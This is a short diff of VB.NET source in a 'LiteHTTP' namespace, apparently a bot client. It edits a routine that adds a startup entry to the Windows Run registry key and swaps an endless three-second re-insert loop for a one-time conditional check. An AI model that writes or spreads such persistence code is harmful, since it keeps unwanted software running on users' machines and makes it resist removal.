@@ -65,7 +65,7 @@ Namespace LiteHTTP
         End Sub
 
         Private Shared Sub startthread()
-            Do
+            If Settings.startupkey <> "" Then
                 Try
                     If Not Misc.keyExists(Settings.startupkey) Then
                         Dim reg As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
@@ -73,9 +73,8 @@ Namespace LiteHTTP
                     End If
                 Catch
                 End Try
-
                 Thread.Sleep(3000)
-            Loop While True
+            End If
         End Sub
     End Class
 End Namespace
